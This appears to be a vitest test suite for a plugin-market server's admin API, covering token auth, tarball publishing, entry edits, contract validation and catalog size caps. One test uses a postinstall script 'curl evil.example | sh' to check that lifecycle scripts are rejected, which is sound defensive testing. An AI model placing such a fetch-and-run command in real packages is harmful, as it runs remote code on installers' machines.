import { afterEach, beforeEach, describe, expect, it } from 'vitest'
import { parseCatalogProviderPage } from 'dsh-community-market/contracts'
import type { CatalogEntry } from '../src/catalog/store.ts'
import { adminHeaders, bootTestMarket, publishTgz, type TestMarket } from './helpers/server.ts'
import { cleanPackageManifest } from './helpers/tar.ts'

describe('admin bearer-token auth (D5, fail-closed)', () => {
  let market: TestMarket

  beforeEach(async () => {
    market = await bootTestMarket()
  })

  afterEach(async () => {
    await market.close()
  })

  async function postPrepare(baseUrl: string, headers: Record<string, string>): Promise<number> {
    const response = await fetch(`${baseUrl}/v1/admin/manifest/prepare`, { method: 'POST', headers })
    return response.status
  }

  it('answers 401 admin-disabled on every admin endpoint when no token is configured', async () => {
    const disabled = await bootTestMarket({ adminToken: null })
    try {
      for (const [method, path] of [
        ['POST', '/v1/admin/manifest/prepare'],
        ['GET', '/v1/admin/state'],
        ['GET', '/v1/admin/manifest/pending'],
      ] as const) {
        const response = await fetch(`${disabled.baseUrl}${path}`, {
          method,
          headers: { authorization: 'Bearer whatever' },
        })
        expect(response.status, path).toBe(401)
        const parsed = await response.json() as { error: { code: string; message: string } }
        expect(parsed.error.code).toBe('admin-disabled')
        expect(parsed.error.message).toContain('MARKET_SERVER_ADMIN_TOKEN')
      }
      // Even artifact upload is disabled.
      const upload = await publishTgz(disabled.baseUrl, 'whatever')
      expect(upload.status).toBe(401)
    } finally {
      await disabled.close()
    }
  })

  it('answers 401 unauthorized for a missing or wrong token; accepts the correct one', async () => {
    expect(await postPrepare(market.baseUrl, {})).toBe(401)
    expect(await postPrepare(market.baseUrl, adminHeaders('wrong-token'))).toBe(401)
    const bad = await fetch(`${market.baseUrl}/v1/admin/manifest/prepare`, {
      method: 'POST',
      headers: adminHeaders('wrong-token'),
    })
    expect(((await bad.json()) as { error: { code: string } }).error.code).toBe('unauthorized')

    expect(await postPrepare(market.baseUrl, adminHeaders('test-admin-token'))).toBe(200)
  })

  it('rejects malformed authorization schemes', async () => {
    const basic = await fetch(`${market.baseUrl}/v1/admin/state`, {
      headers: { authorization: 'Basic dXNlcjpwYXNz' },
    })
    expect(basic.status).toBe(401)
  })
})

describe('admin entry management (publish / edit / unpublish)', () => {
  let market: TestMarket

  beforeEach(async () => {
    market = await bootTestMarket()
  })

  afterEach(async () => {
    await market.close()
  })

  it('publishes an artifact and lists it in the self-validated provider page', async () => {
    const published = await publishTgz(market.baseUrl, 'test-admin-token')
    expect(published.status).toBe(201)
    const { entry, sha256 } = published.body as { entry: { id: string; packageName: string; version: string; tarball: string }; sha256: string }
    expect(entry.id).toBe('huaanwork/sample-plugin@1.2.3')
    expect(entry.packageName).toBe('@huaanwork/sample-plugin')
    expect(sha256).toMatch(/^[0-9a-f]{64}$/u)

    const page = await (await fetch(`${market.baseUrl}/v1/plugins`)).json()
    expect(() => parseCatalogProviderPage(page)).not.toThrow()
    const items = (page as { items: Array<{ id: string; name: string; latestVersion: string }> }).items
    expect(items).toHaveLength(1)
    expect(items[0]).toMatchObject({
      id: 'huaanwork/sample-plugin@1.2.3',
      name: '@huaanwork/sample-plugin',
      latestVersion: '1.2.3',
    })
  })

  it('rejects publishing a non-zero-dependency tarball at publish time (honest error)', async () => {
    const result = await publishTgz(
      market.baseUrl,
      'test-admin-token',
      cleanPackageManifest({ dependencies: { lodash: '^4.0.0' } }),
    )
    expect(result.status).toBe(422)
    const { error } = result.body as { error: { code: string; message: string } }
    expect(error.code).toBe('nonzero-dependencies')
    expect(error.message).toContain('lodash')
  })

  it('rejects publishing a tarball with lifecycle scripts at publish time', async () => {
    const result = await publishTgz(
      market.baseUrl,
      'test-admin-token',
      cleanPackageManifest({ scripts: { postinstall: 'curl evil.example | sh' } }),
    )
    expect(result.status).toBe(422)
    const { error } = result.body as { error: { code: string; message: string } }
    expect(error.code).toBe('lifecycle-scripts')
    expect(error.message).toContain('postinstall')
  })

  it('rejects publishing bytes that are not a tarball', async () => {
    const params = new URLSearchParams({ displayName: 'X', summary: 'Y' })
    const response = await fetch(`${market.baseUrl}/v1/admin/artifacts?${params.toString()}`, {
      method: 'POST',
      headers: { ...adminHeaders('test-admin-token'), 'content-type': 'application/gzip' },
      body: Buffer.from('not a tarball at all'),
    })
    expect(response.status).toBe(400)
    expect(((await response.json()) as { error: { code: string } }).error.code).toBe('invalid-tarball')
  })

  it('re-publishing identical bytes returns 409 and leaves the published artifact intact (D2)', async () => {
    const first = await publishTgz(market.baseUrl, 'test-admin-token')
    expect(first.status).toBe(201)
    const { entry } = first.body as { entry: { id: string; tarball: string } }
    const artifactUrl = `${market.baseUrl}/artifacts/${entry.tarball}`
    expect((await fetch(artifactUrl)).status).toBe(200)

    const again = await publishTgz(market.baseUrl, 'test-admin-token')
    expect(again.status).toBe(409)
    expect(((again.body as { error: { code: string } }).error.code)).toBe('already-published')

    // The artifact the existing entry references must still download.
    const download = await fetch(artifactUrl)
    expect(download.status).toBe(200)

    // The catalog page is still contract-valid and the release pipeline still works.
    const page = await (await fetch(`${market.baseUrl}/v1/plugins`)).json()
    expect(() => parseCatalogProviderPage(page)).not.toThrow()
    const prepare = await fetch(`${market.baseUrl}/v1/admin/manifest/prepare`, {
      method: 'POST',
      headers: adminHeaders('test-admin-token'),
    })
    expect(prepare.status).toBe(200)
  })

  it('edits display fields and surfaces them in the provider page', async () => {
    const published = await publishTgz(market.baseUrl, 'test-admin-token')
    const { entry } = published.body as { entry: { id: string } }
    const response = await fetch(`${market.baseUrl}/v1/admin/entries/${encodeURIComponent(entry.id)}`, {
      method: 'PATCH',
      headers: { ...adminHeaders('test-admin-token'), 'content-type': 'application/json' },
      body: JSON.stringify({ displayName: 'Renamed Plugin', summary: 'New summary', categories: ['utility', 'productivity'] }),
    })
    expect(response.status).toBe(200)

    const page = (await (await fetch(`${market.baseUrl}/v1/plugins`)).json()) as {
      items: Array<{ displayName: string; summary: string; categories: string[] }>
    }
    expect(page.items[0]?.displayName).toBe('Renamed Plugin')
    expect(page.items[0]?.summary).toBe('New summary')
    expect(page.items[0]?.categories).toEqual(['utility', 'productivity'])
  })

  it('preflights URL-typed display fields: empty is OK, non-https is rejected (R15)', async () => {
    const published = await publishTgz(market.baseUrl, 'test-admin-token')
    const { entry } = published.body as { entry: { id: string } }
    const id = encodeURIComponent(entry.id)

    // empty homepage: fine (unset)
    const empty = await fetch(`${market.baseUrl}/v1/admin/entries/${id}`, {
      method: 'PATCH',
      headers: { ...adminHeaders('test-admin-token'), 'content-type': 'application/json' },
      body: JSON.stringify({ homepage: '' }),
    })
    expect(empty.status).toBe(200)

    // https values: accepted, and they land in the provider page (which stays contract-valid)
    const https = await fetch(`${market.baseUrl}/v1/admin/entries/${id}`, {
      method: 'PATCH',
      headers: { ...adminHeaders('test-admin-token'), 'content-type': 'application/json' },
      body: JSON.stringify({
        homepage: 'https://example.internal/docs',
        publisherName: 'HuaAn',
        publisherUrl: 'https://example.internal',
        repositoryUrl: 'https://example.internal/repo.git',
      }),
    })
    expect(https.status).toBe(200)
    const page = await (await fetch(`${market.baseUrl}/v1/plugins`)).json()
    expect(() => parseCatalogProviderPage(page)).not.toThrow()
    const item = (page as { items: Array<{ homepage: string; publisher: { name: string; url: string }; repository: { url: string } }> }).items[0]!
    expect(item.homepage).toBe('https://example.internal/docs')
    expect(item.publisher).toEqual({ name: 'HuaAn', url: 'https://example.internal' })
    expect(item.repository).toEqual({ url: 'https://example.internal/repo.git' })

    // plain http / ftp values: rejected with a pointer at the field
    for (const [field, value] of [['homepage', 'http://intranet/plain'], ['publisherUrl', 'ftp://example'], ['repositoryUrl', 'http://git.internal/x']] as const) {
      const rejected = await fetch(`${market.baseUrl}/v1/admin/entries/${id}`, {
        method: 'PATCH',
        headers: { ...adminHeaders('test-admin-token'), 'content-type': 'application/json' },
        body: JSON.stringify({ [field]: value }),
      })
      expect(rejected.status, `${field}=${value}`).toBe(400)
      const parsed = await rejected.json() as { error: { code: string; message: string } }
      expect(parsed.error.code).toBe('invalid-entry-patch')
      expect(parsed.error.message).toContain(field)
      expect(parsed.error.message).toContain('https')
    }
  })

  it('unpublishes an entry: gone from the page, state reports it', async () => {
    const published = await publishTgz(market.baseUrl, 'test-admin-token')
    const { entry } = published.body as { entry: { id: string } }
    const response = await fetch(
      `${market.baseUrl}/v1/admin/entries/${encodeURIComponent(entry.id)}/unpublish`,
      { method: 'POST', headers: adminHeaders('test-admin-token') },
    )
    expect(response.status).toBe(200)

    const page = (await (await fetch(`${market.baseUrl}/v1/plugins`)).json()) as { page: { total: number } }
    expect(page.page.total).toBe(0)

    const state = (await (await fetch(`${market.baseUrl}/v1/admin/state`, { headers: adminHeaders('test-admin-token') })).json()) as {
      entries: unknown[]
      entryCount: number
    }
    expect(state.entryCount).toBe(0)
    expect(state.entries).toEqual([])

    // unpublishing again: 404
    const again = await fetch(
      `${market.baseUrl}/v1/admin/entries/${encodeURIComponent(entry.id)}/unpublish`,
      { method: 'POST', headers: adminHeaders('test-admin-token') },
    )
    expect(again.status).toBe(404)
  })

  it('rejects patches with unknown or wrongly-typed fields', async () => {
    const published = await publishTgz(market.baseUrl, 'test-admin-token')
    const { entry } = published.body as { entry: { id: string } }
    const id = encodeURIComponent(entry.id)
    const patch = async (body: unknown): Promise<number> => {
      const response = await fetch(`${market.baseUrl}/v1/admin/entries/${id}`, {
        method: 'PATCH',
        headers: { ...adminHeaders('test-admin-token'), 'content-type': 'application/json' },
        body: JSON.stringify(body),
      })
      return response.status
    }
    expect(await patch({ noSuchField: 'x' })).toBe(400)
    expect(await patch({ displayName: '' })).toBe(400)
    expect(await patch({ categories: 'not-an-array' })).toBe(400)
    expect(await patch('not-an-object')).toBe(400)
    // unknown id
    const missing = await fetch(`${market.baseUrl}/v1/admin/entries/nope%40missing`, {
      method: 'PATCH',
      headers: { ...adminHeaders('test-admin-token'), 'content-type': 'application/json' },
      body: JSON.stringify({ displayName: 'X' }),
    })
    expect(missing.status).toBe(404)
  })
})

describe('write-side contract validation + read-side poisoning (D3/D4)', () => {
  let market: TestMarket

  beforeEach(async () => {
    market = await bootTestMarket()
  })

  afterEach(async () => {
    await market.close()
  })

  async function catalogHealth(): Promise<void> {
    const page = await fetch(`${market.baseUrl}/v1/plugins`)
    expect(page.status).toBe(200)
    const body: unknown = await page.json()
    expect(() => parseCatalogProviderPage(body)).not.toThrow()
    const prepare = await fetch(`${market.baseUrl}/v1/admin/manifest/prepare`, {
      method: 'POST',
      headers: adminHeaders('test-admin-token'),
    })
    expect(prepare.status).toBe(200)
  }

  it('rejects a contract-violating displayName at publish time (400) and keeps the catalog healthy', async () => {
    const result = await publishTgz(
      market.baseUrl,
      'test-admin-token',
      cleanPackageManifest(),
      { displayName: 'x'.repeat(200) },
    )
    expect(result.status).toBe(400)
    const { error } = result.body as { error: { code: string; message: string } }
    expect(error.code).toBe('invalid-entry-contract')
    expect(error.message).toContain('displayName')
    await catalogHealth()
  })

  it('rejects a contract-violating PATCH (over-long displayName, bad capability/category, bad updatedAt) and keeps the stored entry intact', async () => {
    const published = await publishTgz(market.baseUrl, 'test-admin-token')
    const { entry } = published.body as { entry: { id: string } }
    const id = encodeURIComponent(entry.id)
    const patch = async (body: unknown): Promise<unknown> => {
      const response = await fetch(`${market.baseUrl}/v1/admin/entries/${id}`, {
        method: 'PATCH',
        headers: { ...adminHeaders('test-admin-token'), 'content-type': 'application/json' },
        body: JSON.stringify(body),
      })
      return response.json()
    }

    for (const [label, body, hint] of [
      ['over-long displayName', { displayName: 'x'.repeat(200) }, 'displayName'],
      ['control character in summary', { summary: 'line1\nline2' }, 'summary'],
      ['capability without dot', { capabilities: ['nodot'] }, 'capabilities'],
      ['uppercase category', { categories: ['Utility'] }, 'categories'],
      ['non-date updatedAt', { updatedAt: 'yesterday' }, 'updatedAt'],
    ] as const) {
      const parsed = await patch(body) as { error: { code: string; message: string } }
      expect(parsed.error.code, label).toBe('invalid-entry-contract')
      expect(parsed.error.message, label).toContain(hint)
    }

    // The stored entry is untouched and the whole catalog still serves.
    const page = (await (await fetch(`${market.baseUrl}/v1/plugins`)).json()) as {
      items: Array<{ displayName: string; summary: string }>
    }
    expect(page.items[0]).toMatchObject({ displayName: 'Sample Plugin', summary: 'A sample plugin' })
    await catalogHealth()
  })

  it('rejects https URIs with userinfo, port, or fragment at write time (D3a)', async () => {
    const published = await publishTgz(market.baseUrl, 'test-admin-token')
    const { entry } = published.body as { entry: { id: string } }
    const id = encodeURIComponent(entry.id)
    for (const [field, value] of [
      ['homepage', 'https://user:pass@example.internal/docs'],
      ['homepage', 'https://example.internal:8443/docs'],
      ['homepage', 'https://example.internal/docs#frag'],
      ['publisherUrl', 'https://user:pass@example.internal'],
      ['repositoryUrl', 'https://example.internal:8443/repo.git'],
    ] as const) {
      const rejected = await fetch(`${market.baseUrl}/v1/admin/entries/${id}`, {
        method: 'PATCH',
        headers: { ...adminHeaders('test-admin-token'), 'content-type': 'application/json' },
        body: JSON.stringify({ [field]: value }),
      })
      expect(rejected.status, `${field}=${value}`).toBe(400)
      const parsed = await rejected.json() as { error: { code: string } }
      expect(parsed.error.code, `${field}=${value}`).toBe('invalid-entry-patch')
    }
    await catalogHealth()
  })

  it('read-side self-validation failure of stored state answers 500 invalid-stored-catalog without ajv internals (D3b)', async () => {
    // Seed corrupt state directly (bypasses the write-side guards, simulating
    // an operator-edited state file): a control character in displayName.
    await market.store.replaceEntries([
      {
        id: 'poisoned@1.0.0',
        packageName: 'poisoned',
        version: '1.0.0',
        displayName: 'bad\u0007name',
        summary: 'A poisoned entry',
      },
    ])
    const response = await fetch(`${market.baseUrl}/v1/plugins`)
    expect(response.status).toBe(500)
    const text = await response.text()
    const parsed = JSON.parse(text) as { error: { code: string; message: string } }
    expect(parsed.error.code).toBe('invalid-stored-catalog')
    expect(parsed.error.message).toBe('stored catalog state cannot produce a valid provider page')
    // The ajv instancePath/pattern internals must NOT leak to the client.
    expect(text).not.toContain('instancePath')
    expect(text).not.toContain('must match pattern')
    expect(text).not.toContain('/items/0')
  })

  it('rejects a publish whose catalog entry id would exceed the contract identifier maxLength of 160 (D4)', async () => {
    const result = await publishTgz(market.baseUrl, 'test-admin-token', cleanPackageManifest({ name: 'a'.repeat(155) }))
    expect(result.status).toBe(422)
    const { error } = result.body as { error: { code: string; message: string } }
    expect(error.code).toBe('invalid-package-identity')
    await catalogHealth()
  })
})

describe('manifest/prepare honest 4xx (review D14d)', () => {
  let market: TestMarket

  beforeEach(async () => {
    market = await bootTestMarket()
  })

  afterEach(async () => {
    await market.close()
  })

  it('answers 409 artifact-missing (not a bare 500) when an entry points at a vanished artifact', async () => {
    const published = await publishTgz(market.baseUrl, 'test-admin-token')
    expect(published.status).toBe(201)
    const { entry } = published.body as { entry: { id: string; tarball: string } }
    // Operator cleanup path: the artifact file is gone while the entry still points at it.
    await market.artifacts.remove(entry.tarball)

    const prepare = await fetch(`${market.baseUrl}/v1/admin/manifest/prepare`, {
      method: 'POST',
      headers: adminHeaders('test-admin-token'),
    })
    expect(prepare.status).toBe(409)
    const parsed = await prepare.json() as { error: { code: string; message: string } }
    expect(parsed.error.code).toBe('artifact-missing')
    expect(parsed.error.message).toContain(entry.tarball)
    // The operator guidance must reach the response, not just the server log.
    expect(parsed.error.message).toContain('re-publish')
  })

  it('answers 422 catalog-too-large at 201 entries instead of a 500, with the operator guidance inline', async () => {
    const published = await publishTgz(market.baseUrl, 'test-admin-token')
    expect(published.status).toBe(201)
    const { entry } = published.body as { entry: CatalogEntry }
    const entries: CatalogEntry[] = [entry]
    for (let index = 1; entries.length <= 200; index += 1) {
      entries.push({
        ...entry,
        id: `bulk/pkg-${index}@1.0.0`,
        packageName: `bulk-pkg-${index}`,
      })
    }
    await market.store.replaceEntries(entries)

    const prepare = await fetch(`${market.baseUrl}/v1/admin/manifest/prepare`, {
      method: 'POST',
      headers: adminHeaders('test-admin-token'),
    })
    expect(prepare.status).toBe(422)
    const parsed = await prepare.json() as { error: { code: string; message: string } }
    expect(parsed.error.code).toBe('catalog-too-large')
    expect(parsed.error.message).toContain('201')
    expect(parsed.error.message).toContain('Split the source')
  })

  // 评审 D15:只在 prepare 时拒绝 ⇒ 第 201 条照样上架、之后 prepare 永久失败,
  // 运营者连既有的 200 条也发不出新清单(整条发布链冻结,非优雅降级)。上限前移
  // 到发布时后,市场永不进入冻结态。回退 publish 侧的 cap 检查即红。
  it('rejects the 201st entry at publish time so the catalog can never freeze (review D15)', async () => {
    const published = await publishTgz(market.baseUrl, 'test-admin-token')
    expect(published.status).toBe(201)
    const { entry } = published.body as { entry: CatalogEntry }
    const entries: CatalogEntry[] = [entry]
    for (let index = 1; entries.length < 200; index += 1) {
      entries.push({ ...entry, id: `bulk/pkg-${index}@1.0.0`, packageName: `bulk-pkg-${index}` })
    }
    expect(entries).toHaveLength(200)
    await market.store.replaceEntries(entries)

    const prepare = () => fetch(`${market.baseUrl}/v1/admin/manifest/prepare`, {
      method: 'POST',
      headers: adminHeaders('test-admin-token'),
    })
    // 恰在上限时 prepare 仍然可用(其自身守卫是 `> MAX`)。
    expect((await prepare()).status).toBe(200)

    const overflow = await publishTgz(market.baseUrl, 'test-admin-token', cleanPackageManifest({ name: 'overflow-pkg', version: '1.0.0' }))
    expect(overflow.status).toBe(422)
    const parsed = overflow.body as { error: { code: string; message: string } }
    expect(parsed.error.code).toBe('catalog-full')
    expect(parsed.error.message).toContain('200')
    expect(parsed.error.message).toContain('unpublish')

    // 被拒的发布没有改变目录,且发布链**没有冻结**——这正是本条的目的。
    expect(market.store.entries()).toHaveLength(200)
    expect((await prepare()).status).toBe(200)
  })
})

// 裁定 R-3:上限可配置(**只能调低**——契约天花板 200 由 config 启动校验钉死)。
// 发布时 cap 与 prepare 纵深都必须读**配置值**,不得各自写死字面量。
describe('catalog scale cap configured below the contract maximum (ruling R-3)', () => {
  let market: TestMarket

  beforeEach(async () => {
    market = await bootTestMarket({ maxCatalogEntries: 50 })
  })

  afterEach(async () => {
    await market.close()
  })

  it('rejects the 51st entry at publish time when the cap is configured to 50', async () => {
    const published = await publishTgz(market.baseUrl, 'test-admin-token')
    expect(published.status).toBe(201)
    const { entry } = published.body as { entry: CatalogEntry }
    const entries: CatalogEntry[] = [entry]
    for (let index = 1; entries.length < 50; index += 1) {
      entries.push({ ...entry, id: `bulk/pkg-${index}@1.0.0`, packageName: `bulk-pkg-${index}` })
    }
    expect(entries).toHaveLength(50)
    await market.store.replaceEntries(entries)

    const prepare = () => fetch(`${market.baseUrl}/v1/admin/manifest/prepare`, {
      method: 'POST',
      headers: adminHeaders('test-admin-token'),
    })
    // 恰在上限时 prepare 仍然可用(其自身守卫是 `> cap`)。
    expect((await prepare()).status).toBe(200)

    const overflow = await publishTgz(market.baseUrl, 'test-admin-token', cleanPackageManifest({ name: 'overflow-pkg', version: '1.0.0' }))
    expect(overflow.status).toBe(422)
    const parsed = overflow.body as { error: { code: string; message: string } }
    expect(parsed.error.code).toBe('catalog-full')
    // 诚实点名**配置值**,而不是契约默认 200。
    expect(parsed.error.message).toContain('50')
    expect(parsed.error.message).toContain('unpublish')

    // 被拒的发布没有改变目录,且发布链没有冻结。
    expect(market.store.entries()).toHaveLength(50)
    expect((await prepare()).status).toBe(200)
  })
})
